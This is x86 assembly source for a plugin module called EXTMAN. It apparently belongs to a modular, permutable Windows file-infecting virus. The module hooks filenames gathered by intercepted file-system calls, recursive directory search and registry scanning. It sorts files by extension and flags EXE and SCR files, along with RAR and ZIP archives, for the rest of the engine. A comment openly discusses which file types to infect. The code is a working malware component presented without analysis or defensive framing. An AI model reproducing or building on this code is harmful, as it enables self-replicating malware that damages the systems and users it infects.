   ; EXTMAN
   ; ~~~~~~
   ; - on each new file name found
   ; - analyze file extension
   ; - generate EV_EXTMAN_GOT_FILENAME (ecx=lowercase extension) &
   ;   EV_EXTMAN_GOT_EXECEXT events

   include                 INCLUDE\consts.inc
   include                 ifscall.inc
   include                 recserch.inc
   include                 regscan.inc

   include                 plugin.inc
                           PLUGIN_START    EXTMAN, CODE32,PERMUTABLE

   handleevent:            hookevent EV_IFSCALL_GOT_FILENAME, checkfilename
                           hookevent EV_RECSERCH_GOT_FILENAME, checkfilename
                           hookevent EV_REGSCAN_GOT_FILENAME, checkfilename
                           stc
                           retn

   ; input: EDX=filename

   checkfilename:
                           pusha
                           mov     edi, edx
                           mov     ecx, 1024
                           xor     eax, eax
                           cld
                           repnz   scasb
                           mov     ecx, [edi-5]
                           or      ecx, 20202000h
                           mov     [esp].popa_ecx, ecx  ; popa.ecx
                           popa

                           pusha
                           event   EV_EXTMAN_GOT_FILENAME
                           popa
                           jnc     __exit  ; handled?

                           neg     ecx

                           cmp     ecx, -EXT_EXE
                           je      __execext
                           cmp     ecx, -EXT_SCR
                           je      __execext

   ;; DLLs sould be skipped -- lots of reasons to DONT infect 'em
   ;                       cmp     ecx, -EXT_DLL
   ;                       je      __execext

   ;                       cmp     ecx, -EXT_VXD
   ;                       je      __execext

                           cmp     ecx, -'rar.'
                           je      __rar
                           cmp     ecx, -'piz.'
                           je      __zip

                           neg     ecx

   __exit:                 stc
                           retn

   __execext:              neg     ecx

                           pusha
                           event   EV_EXTMAN_GOT_EXECEXT
                           popa

                           jmp     __exit

   __rar:                  neg     ecx

                           pusha
                           event   EV_EXTMAN_GOT_RAR
                           popa

                           jmp     __exit

   __zip:                  neg     ecx

                           pusha
                           event   EV_EXTMAN_GOT_ZIP
                           popa

                           jmp     __exit

                           PLUGIN_END
